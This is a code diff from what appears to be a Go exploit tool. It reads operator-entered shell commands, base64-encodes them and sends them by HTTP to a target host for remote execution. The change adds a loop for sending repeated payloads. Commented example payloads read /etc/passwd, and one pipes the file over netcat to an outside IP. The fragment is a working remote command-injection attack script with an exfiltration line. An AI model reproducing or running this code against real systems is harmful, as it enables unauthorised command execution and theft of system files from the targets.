@@ -23,13 +23,14 @@ func PayloadInput() {
 
 	fmt.Println("Testing curl...")
 	for {
+		exitChan := make(chan struct{})
 		fmt.Println("Enter the payload command:")
 		scanner := bufio.NewScanner(os.Stdin)
 		if scanner.Scan() {
 			payloadcmd = scanner.Text()
 		}
 		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt && nc " + sourceip.String() + " 1304 < /tmp/passwd.txt"
-		// payloadcmd = "cat /etc/passwd > /tmp/passwd.txt"
+		// payloadcmd = 'sh -c "cat /etc/passwd > /tmp/test"'
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
 		targeturl := "http://" + targetip + ":" + targetport
 		req, err := http.NewRequest(("GET"), targeturl, nil)
@@ -57,10 +58,18 @@ func PayloadInput() {
 		}
 		if string(responseBody) == "Hello, world!" {
 			fmt.Println("Payload sent. Expoloit successful.")
+			fmt.Println("Do you want to send another payload? (yes/no)")
+			scanner := bufio.NewScanner(os.Stdin)
+			if scanner.Scan() {
+				response := scanner.Text()
+				if response != "yes" {
+					close(exitChan)
+					break
+				}
+			}
 		} else {
-			fmt.Println("Payload sent failed. Please try again.")
+			fmt.Println("Payload failed. Please try again.")
 			continue
 		}
-		break
 	}
 }
